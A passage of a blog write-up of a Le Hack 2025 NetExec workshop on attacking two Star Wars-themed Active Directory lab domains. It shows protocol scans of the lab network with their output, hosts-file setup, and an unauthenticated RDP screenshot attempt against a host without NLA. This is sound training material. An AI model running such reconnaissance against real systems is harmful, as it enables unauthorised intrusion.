<!doctype html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Le Hack 2025 - NetExec Workshop 🕷️ // ledrypotato</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.147.9">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="ledrypotato" />
    <meta name="description" content="Active Directory exploitation with NetExec" />
    <link rel="stylesheet" href="/css/main.min.50f7b56d011cc3efdb9a5145fbfa6cabb3c4e6e5a3d2c34b0a6432d881feafa6.css" />
    

    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Le Hack 2025 - NetExec Workshop 🕷️">
  <meta name="twitter:description" content="Active Directory exploitation with NetExec">

    <meta property="og:url" content="http://localhost:1313/le-hack-2025-netexec-workshop/">
  <meta property="og:site_name" content="ledrypotato">
  <meta property="og:title" content="Le Hack 2025 - NetExec Workshop 🕷️">
  <meta property="og:description" content="Active Directory exploitation with NetExec">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-06-30T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-06-30T00:00:00+00:00">
    <meta property="article:tag" content="LeHack">
    <meta property="article:tag" content="NetExec">
    <meta property="article:tag" content="BloodHound">
    <meta property="article:tag" content="MSSQL">
    <meta property="article:tag" content="GMSA">
    <meta property="article:tag" content="Kerberoasting">


  </head>
  <body>
    <header class="app-header">
      <a href="/"><img class="app-header-avatar" src="/avatar.jpg" alt="ledrypotato" /></a>
      <span class="app-header-title">ledrypotato</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p>Cybersecurity notes</p>
      <div class="app-header-social">
        
          <a href="https://github.com/ledrypotato" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
          </a>
        
          <a href="https://app.hackthebox.com/profile/716757" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-hackthebox" viewBox="0 0 24 24" fill="currentColor"><title>Hack The Box</title><path d="m22.5106 6.4566.0008-.0123a.888.888 0 0 0-.2717-.6384c-.0084-.0084-.018-.0155-.0267-.0235-.0186-.0166-.0371-.0333-.0572-.0484-.0193-.0147-.04-.0276-.0607-.0406-.0096-.006-.0182-.0131-.0281-.0188L12.4576.1266a.891.891 0 0 0-.9223.0043L1.933 5.6744c-.0107.0062-.0203.014-.0307.0205-.0073.0047-.015.008-.0223.0128-.007.0047-.013.0106-.02.0155a.8769.8769 0 0 0-.147.1333l-.0026.003a.8872.8872 0 0 0-.2218.5847l.0009.014c-.0002.0088-.0015.0176-.0015.0264v11.0708c0 .3277.1802.6288.469.7836l9.5986 5.5417c.0076.0044.0158.0075.0236.0117a.8754.8754 0 0 0 .166.0687c.0134.004.0266.0083.0401.0117a.8793.8793 0 0 0 .072.0142c.0117.0019.0232.0045.0349.006a.835.835 0 0 0 .2157 0c.0117-.0015.0232-.0041.0348-.006a.9.9 0 0 0 .072-.0142c.0135-.0034.0267-.0077.04-.0117a.895.895 0 0 0 .0646-.0217.9134.9134 0 0 0 .1015-.047c.0078-.0042.016-.0072.0236-.0117l9.5986-5.5417a.8888.8888 0 0 0 .469-.7836V6.4779c0-.0071-.0012-.0142-.0014-.0213zM5.2543 6.0822l6.5367-3.774a.4182.4182 0 0 1 .4182 0l6.5366 3.774a.4182.4182 0 0 1 0 .7243l-6.5367 3.774a.4182.4182 0 0 1-.4182 0l-6.5366-3.774a.4182.4182 0 0 1 0-.7243zm5.6134 14.3449a.4172.4172 0 0 1-.626.3613L3.718 17.0218a.4173.4173 0 0 1-.2086-.3613V9.1279a.4172.4172 0 0 1 .6258-.3613l6.524 3.7666a.4172.4172 0 0 1 .2086.3614v7.5325zm9.623-3.7666a.4173.4173 0 0 1-.2086.3613l-6.5239 3.7666a.4172.4172 0 0 1-.6259-.3613v-7.5325c0-.149.0796-.2868.2087-.3614l6.5239-3.7666a.4172.4172 0 0 1 .6258.3613v7.5326z"/></svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Le Hack 2025 - NetExec Workshop 🕷️</h1>
      <div class="post-meta">
        <div>
          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
          Jun 30, 2025
        </div>
        <div>
          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
          
            10 min read
          
        </div>
        <div>
          <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
              <a class="tag" href="/tags/lehack/">LeHack</a>
              <a class="tag" href="/tags/netexec/">NetExec</a>
              <a class="tag" href="/tags/bloodhound/">BloodHound</a>
              <a class="tag" href="/tags/mssql/">MSSQL</a>
              <a class="tag" href="/tags/gmsa/">GMSA</a>
              <a class="tag" href="/tags/kerberoasting/">Kerberoasting</a>
              <a class="tag" href="/tags/as-rep-roasting/">AS-REP Roasting</a>
              <a class="tag" href="/tags/pre2k/">Pre2k</a>
              <a class="tag" href="/tags/backupoperator/">BackupOperator</a>
              <a class="tag" href="/tags/notepad&#43;&#43;/">Notepad&#43;&#43;</a>
              <a class="tag" href="/tags/secretsdump/">Secretsdump</a>
        </div>
      </div>
    </header>
    
    
     <div class="toc-container">
          <h3>Table of Contents</h3>
          <nav id="TableOfContents">
  <ul>
    <li><a href="#context">Context</a></li>
    <li><a href="#discovery--enumeration">Discovery &amp; Enumeration</a></li>
    <li><a href="#setup---etchosts">Setup - <code>/etc/hosts</code></a></li>
    <li><a href="#rdp---nlafalse">RDP - <code>(nla:False)</code></a></li>
    <li><a href="#as-rep-roasting--kerberoasting-without-pre-authentication">AS-REP Roasting &amp; Kerberoasting (without pre-authentication)</a></li>
    <li><a href="#credentials----krennic">Credentials 🔑 - <code>krennic</code></a></li>
    <li><a href="#domain-1---empirelocal">Domain 1 - <code>empire.local</code></a>
      <ul>
        <li><a href="#mssql-enumeration-on-mustafar">MSSQL enumeration on <code>MUSTAFAR</code></a></li>
        <li><a href="#bloodhound-analysis-">BloodHound Analysis 🐶</a></li>
        <li><a href="#bad-successor">Bad Successor?</a></li>
        <li><a href="#back-to-mssql-on-mustafar">Back to MSSQL on <code>MUSTAFAR</code></a>
          <ul>
            <li><a href="#credentials----droideka">Credentials 🔑 - <code>droideka</code></a></li>
            <li><a href="#enumerating-mssql-links">Enumerating MSSQL Links</a></li>
            <li><a href="#executing-commands-on-a-linked-mssql-server">Executing Commands on a Linked MSSQL Server</a></li>
          </ul>
        </li>
        <li><a href="#pre-created-computer-accounts---pre2k">Pre-Created Computer Accounts - Pre2k</a></li>
        <li><a href="#credentials----endor">Credentials 🔑 - <code>endor</code></a></li>
      </ul>
    </li>
    <li><a href="#domain-2---rebelslocal">Domain 2 - <code>rebels.local</code></a>
      <ul>
        <li><a href="#group-managed-service-account-gmsa">Group Managed Service Account (gMSA)</a></li>
        <li><a href="#credentials----gmsa-scarif">Credentials 🔑 - <code>gMSA-scarif$</code></a></li>
        <li><a href="#enumeration-as-gmsa-scarif">Enumeration as <code>gMSA-scarif$</code></a></li>
        <li><a href="#enumerating-the-destroyer_access-share-with-spider_plus">Enumerating the <code>Destroyer_Access</code> share with <code>spider_plus</code></a></li>
        <li><a href="#enumerating-notepad-files">Enumerating Notepad++ files</a></li>
        <li><a href="#password-spraying-">Password Spraying 💦</a></li>
        <li><a href="#credentials----obiwan">Credentials 🔑 - <code>obiwan</code></a></li>
        <li><a href="#backup-operator">Backup Operator</a></li>
        <li><a href="#secretsdump">Secretsdump</a></li>
        <li><a href="#password-spraying-on-empirelocal-">Password Spraying on <code>empire.local</code> 💦</a></li>
      </ul>
    </li>
    <li><a href="#thanks--final-thoughts">Thanks &amp; Final Thoughts</a></li>
  </ul>
</nav>
      </div>
      <div class="post-content">
        <hr>
<h2 id="context">Context</h2>
<p>Every year <a href="https://lehack.org/fr/">Le Hack</a> takes place in Paris. This cybersecurity event offers talks and workshops in loads of different fields.</p>
<p>This year again <a href="https://x.com/mpgn_x64">@mpgn_x64</a> (Martial Puygrenier), <a href="https://x.com/wil_fri3d">@wil_fri3d</a> (Wilfried BÉCARD) and <a href="https://x.com/_zblurx">@_zblurx</a> (Thomas Seigneuret) organized a <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> workshop. I was lucky enough to attend it last year as well but only managed to compromise 1 of the 2 Active Directory domains 😔&hellip;</p>
<p>This year my objective was to compromise both domains 😁!</p>
<p>The goal of this workshop is to use exclusively NetExec to compromise 2 Active Directory domains, this year&rsquo;s theme is Star Wars 🚀💫!</p>
<hr>
<h2 id="discovery--enumeration">Discovery &amp; Enumeration</h2>
<p>We know that we are on the 10.0.0.0/24 network, let&rsquo;s start scanning!</p>
<p>We can create a file called <code>proto.txt</code> that contains all the different protocols that are implemented in NetExec:</p>
<pre tabindex="0"><code>ssh
mssql
smb
winrm
nfs
wmi
ldap
vnc
ftp
rdp
</code></pre><p>Then loop over them to see what services are open/responding to us:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>cat proto.txt<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> nxc $i targets.txt --log nxc/all-proto.txt;<span style="color:#66d9ef">done</span>                                                                        
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                                
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.8        <span style="color:#ae81ff">1433</span>   DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span>                                                                                     
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                      
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                                
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                     
</span></span><span style="display:flex;"><span>SMB         10.0.0.5        <span style="color:#ae81ff">445</span>    coruscant        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:coruscant<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                    
</span></span><span style="display:flex;"><span>SMB         10.0.0.7        <span style="color:#ae81ff">445</span>    jedha            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:jedha<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                        
</span></span><span style="display:flex;"><span>SMB         10.0.0.8        <span style="color:#ae81ff">445</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>                                                    
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                                
</span></span><span style="display:flex;"><span>WINRM       10.0.0.5        <span style="color:#ae81ff">5985</span>   coruscant        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:coruscant<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                     
</span></span><span style="display:flex;"><span>WINRM       10.0.0.6        <span style="color:#ae81ff">5985</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                      
</span></span><span style="display:flex;"><span>WINRM       10.0.0.7        <span style="color:#ae81ff">5985</span>   jedha            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:jedha<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span>                                                                                         
</span></span><span style="display:flex;"><span>WINRM       10.0.0.8        <span style="color:#ae81ff">5985</span>   DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span>                                                                                     
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                                
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                                
</span></span><span style="display:flex;"><span>RPC         10.0.0.7        <span style="color:#ae81ff">135</span>    jedha            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:jedha<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span>                                                                                         
</span></span><span style="display:flex;"><span>RPC         10.0.0.6        <span style="color:#ae81ff">135</span>    MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                      
</span></span><span style="display:flex;"><span>RPC         10.0.0.5        <span style="color:#ae81ff">135</span>    coruscant        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:coruscant<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                     
</span></span><span style="display:flex;"><span>RPC         10.0.0.8        <span style="color:#ae81ff">135</span>    DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span>                                                                                     
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                                
</span></span><span style="display:flex;"><span>LDAP        10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:CORUSCANT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:No TLS cert<span style="color:#f92672">)</span>                                        
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:JEDHA<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:Never<span style="color:#f92672">)</span>                                                  
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                                
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                                
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00                                                                                                                                
</span></span><span style="display:flex;"><span>RDP         10.0.0.5        <span style="color:#ae81ff">3389</span>   coruscant        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> or Windows Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:coruscant<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>nla:True<span style="color:#f92672">)</span>                                                            
</span></span><span style="display:flex;"><span>RDP         10.0.0.8        <span style="color:#ae81ff">3389</span>   DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> or Windows Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>nla:True<span style="color:#f92672">)</span>                                                            
</span></span><span style="display:flex;"><span>RDP         10.0.0.7        <span style="color:#ae81ff">3389</span>   jedha            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> or Windows Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:jedha<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>nla:True<span style="color:#f92672">)</span>                                                                
</span></span><span style="display:flex;"><span>RDP         10.0.0.6        <span style="color:#ae81ff">3389</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> or Windows Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>nla:False<span style="color:#f92672">)</span>                                                            
</span></span><span style="display:flex;"><span>Running nxc against <span style="color:#ae81ff">4</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
</span></span></code></pre></div><p>We know that there are 4 machines with the following ports open:</p>
<table>
  <thead>
      <tr>
          <th>Machine</th>
          <th>IP</th>
          <th>Open ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>coruscant</td>
          <td>10.0.0.5</td>
          <td>135, 389, 445, 3389, 5985</td>
      </tr>
      <tr>
          <td>MUSTAFAR</td>
          <td>10.0.0.6</td>
          <td>135, 445, 1433, 3389, 5985</td>
      </tr>
      <tr>
          <td>jedha</td>
          <td>10.0.0.7</td>
          <td>135, 389, 445, 3389, 5985</td>
      </tr>
      <tr>
          <td>DANTOOINE</td>
          <td>10.0.0.8</td>
          <td>135, 445, 1433, 3389, 5985</td>
      </tr>
  </tbody>
</table>
<p>The 4 machine names correspond to planet names in Star Wars, this will come in handy later on.</p>
<h2 id="setup---etchosts">Setup - <code>/etc/hosts</code></h2>
<p>We can generate a hosts file with the <code>--generate-hosts-file</code> flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb targets.txt --generate-hosts-file hosts
</span></span></code></pre></div><p>Then append them to <code>/etc/hosts</code>:</p>
<pre tabindex="0"><code>10.0.0.5 coruscant coruscant.empire.local empire.local
10.0.0.6 MUSTAFAR MUSTAFAR.empire.local
10.0.0.7 jedha jedha.rebels.local rebels.local
10.0.0.8 DANTOOINE DANTOOINE.rebels.local
</code></pre><h2 id="rdp---nlafalse">RDP - <code>(nla:False)</code></h2>
<p>Something interesting stands out on the RDP protocol:</p>
<p><img src="_screenshots/Workshop-NetExec-RDP-NLA.png" alt=""></p>
<p>There is no NLA (Network Level Authentication) on the <code>MUSTAFAR</code> machine.</p>

        <link rel="stylesheet" href="/css/vendors/admonitions.css">
  <div class="admonition info">
    <div class="admonition-header">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM216 336l24 0 0-64-24 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l48 0c13.3 0 24 10.7 24 24l0 88 8 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-80 0c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-208a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"/></svg>
      <span>Network Level Authentication (NLA)</span>
    </div>
      <div class="admonition-content">
        <p>&ldquo;Network Level Authentication (NLA) adds an extra layer of security to Remote Desktop connections. With NLA enabled, users must authenticate themselves before a remote session is established.&rdquo; - <a href="https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/remotepc/remote-desktop-allow-access">Microsoft documentation</a></p>
      </div>
  </div>
<p>Knowing this we can use the <code>--nla-screenshot</code> flag to capture the contents of the screen:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc rdp targets.txt -u <span style="color:#e6db74">&#39;a&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --nla-screenshot                                                                                                    
</span></span><span style="display:flex;"><span>RDP         10.0.0.5        <span style="color:#ae81ff">3389</span>   coruscant        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> or Windows Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:coruscant<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>nla:True<span style="color:#f92672">)</span>                                                            
</span></span><span style="display:flex;"><span>RDP         10.0.0.7        <span style="color:#ae81ff">3389</span>   jedha            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> or Windows Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:jedha<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>nla:True<span style="color:#f92672">)</span>                                                                
</span></span><span style="display:flex;"><span>RDP         10.0.0.8        <span style="color:#ae81ff">3389</span>   DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> or Windows Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>nla:True<span style="color:#f92672">)</span>                                                            
</span></span><span style="display:flex;"><span>RDP         10.0.0.5        <span style="color:#ae81ff">3389</span>   coruscant        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\a</span>: <span style="color:#f92672">(</span>STATUS_LOGON_FAILURE<span style="color:#f92672">)</span>                                                                                                                     
</span></span><span style="display:flex;"><span>RDP         10.0.0.7        <span style="color:#ae81ff">3389</span>   jedha            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\a</span>: <span style="color:#f92672">(</span>STATUS_LOGON_FAILURE<span style="color:#f92672">)</span>                                                                                                                     
</span></span><span style="display:flex;"><span>RDP         10.0.0.6        <span style="color:#ae81ff">3389</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> or Windows Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>nla:False<span style="color:#f92672">)</span>                                                            
</span></span><span style="display:flex;"><span>RDP         10.0.0.8        <span style="color:#ae81ff">3389</span>   DANTOOINE        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\a</span>: <span style="color:#f92672">(</span>STATUS_LOGON_FAILURE<span style="color:#f92672">)</span>                                                                                                                     
</span></span><span style="display:flex;"><span>RDP         10.0.0.6        <span style="color:#ae81ff">3389</span>   MUSTAFAR         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\a</span>: <span style="color:#f92672">(</span>STATUS_LOGON_FAILURE<span style="color:#f92672">)</span>                                                                                                                     
